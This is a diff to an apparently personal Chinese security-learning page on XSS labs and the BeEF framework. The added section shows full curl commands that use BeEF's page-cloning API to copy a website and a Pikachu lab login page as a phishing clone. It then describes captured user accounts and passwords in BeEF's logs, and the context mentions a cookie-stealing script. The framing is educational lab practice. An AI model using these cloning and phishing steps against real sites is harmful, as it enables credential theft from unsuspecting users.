@@ -178,7 +178,48 @@ Pikachu 平台已经为我们提供了收集 Cookie 的脚本：`<script>documen
 
 ### BeEF
 
-### 在 M1/M2 Mac 上安装 Kali
+👉 安装见：[02-MacOS M1M2 安装 Kali 和 BeEF 踩坑](https://wukaipeng.com/technique/net-security/07/02)
+
+#### 克隆任意网站
+
+```bash
+➜  ~ curl -H "Content-Type: application/json; charset=UTF-8"  \
+  -d '{"url": "https://wukaipeng.com/", "mount": "/is-wukaipeng"}' \
+  -X POST \
+http://192.168.64.4:3000/api/seng/clone_page\?token\=44738d265d43e98903df4f7b0821b4289dae1bc1
+{"success":true,"mount":"/is-wukaipeng"}%
+```
+
+`-d` 中，`url` 是克隆的目标网站，`mount` 是克隆之后的地址
+
+`POST` 的目标地址是 BeEF 的地址，token 来自与 API Key，见下图：
+
+ ![](http://img.wukaipeng.com/2023/1016-212812-image-20231016212812263.png)
+
+克隆之后的效果：
+
+![](http://img.wukaipeng.com/2023/1016-212558-image-20231016212558649.png)
+
+#### 克隆钓鱼网站并获取用户账号密码
+
+克隆 Pikachu » Cross-Site Scripting » 反射型 XSS（post）页面：
+
+```
+curl -H "Content-Type: application/json; charset=UTF-8"  \
+  -d '{"url": "http://175.178.126.31:8081/vul/xss/xsspost/post_login.php", "mount": "/pikachu"}' \
+  -X POST \
+http://192.168.64.4:3000/api/seng/clone_page?token=44738d265d43e98903df4f7b0821b4289dae1bc1
+```
+
+![](http://img.wukaipeng.com/2023/1016-213332-image-20231016213332776.png)
+
+在 BeEF 后台可以看到已经有其他用户上线该网站了：
+
+![](http://img.wukaipeng.com/2023/1016-213532-image-20231016213532316.png)
+
+当用户输入账号密码后，我们也能通过 Logs 查看得到：
+
+![](http://img.wukaipeng.com/2023/1016-213903-image-20231016213903055.png)
 
 
 
